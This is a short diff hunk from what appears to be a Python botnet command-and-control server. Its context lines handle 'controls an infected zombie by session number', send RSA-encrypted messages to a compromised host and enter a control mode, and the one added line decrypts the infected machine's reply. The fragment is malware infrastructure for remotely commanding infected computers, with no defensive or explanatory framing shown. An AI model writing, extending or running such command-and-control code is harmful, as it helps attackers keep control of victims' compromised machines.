@@ -68,6 +68,7 @@ control <session>         --          controls an infected zombie by session num
 			hello = "\n"
 			zombie.send(rsa.encrypt(hello.encode(), zombiepubkey))
 			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
+			response = rsa.decrypt(zombie.recv(1024), server.private_key).decode()
 			server.control(zombie, zombiepubkey)	
 		except OSError:
 			print("Zombie is currently disconnected on selected session")
